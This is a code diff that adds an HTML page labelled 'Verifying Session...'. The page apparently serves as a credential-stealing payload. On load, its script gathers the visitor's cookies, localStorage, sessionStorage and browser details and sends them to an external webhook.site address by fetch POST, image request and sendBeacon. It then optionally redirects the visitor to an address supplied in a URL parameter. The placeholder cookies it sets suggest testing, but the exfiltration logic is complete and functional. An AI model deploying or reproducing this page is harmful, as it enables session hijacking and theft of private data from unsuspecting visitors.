@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<h2>Verifying Session...</h2>
+<script>
+// Get webhook
+const params = new URLSearchParams(window.location.search);
+const webhook = params.get('webhook') || 'b1647e17-560f-4643-a2d6-14043b4a0eda';
+
+// Check if cookies exist
+const cookies = document.cookie;
+const hasCookies = cookies.length > 0;
+
+// If no cookies, set some test cookies
+if (!hasCookies) {
+    document.cookie = "PHPSESSID=abc123def456; path=/";
+    document.cookie = "auth_token=xyz789token; path=/";
+    document.cookie = "user_id=12345; path=/";
+    document.cookie = "csrf_token=csrf_test_value; path=/";
+    document.cookie = "session=active_session; path=/";
+}
+
+// Collect all data
+const allData = {
+    cookies: document.cookie || "No cookies available",
+    cookieCount: document.cookie.split(';').length || 0,
+    hasCookies: hasCookies,
+    localStorage: JSON.stringify(localStorage) || "Empty",
+    sessionStorage: JSON.stringify(sessionStorage) || "Empty",
+    url: window.location.href,
+    referrer: document.referrer || "Direct",
+    timestamp: Date.now(),
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language
+};
+
+// Send to webhook - Method 1: POST
+fetch(`https://webhook.site/${webhook}`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(allData)
+}).catch(() => {});
+
+// Method 2: Image (GET)
+new Image().src = `https://webhook.site/${webhook}?cookies=${encodeURIComponent(document.cookie)}&data=${encodeURIComponent(JSON.stringify(allData))}`;
+
+// Method 3: Beacon
+if (navigator.sendBeacon) {
+    navigator.sendBeacon(`https://webhook.site/${webhook}`, JSON.stringify(allData));
+}
+
+// Show status
+document.body.innerHTML += `<p>✅ Cookies sent: ${document.cookie ? 'Found ' + document.cookie.split(';').length + ' cookies' : 'No cookies found'}</p>`;
+
+// Redirect if needed
+const redirect = params.get('redirect');
+if (redirect) {
+    setTimeout(() => window.location.href = redirect, 2000);
+}
+</script>
+</body>
+</html>
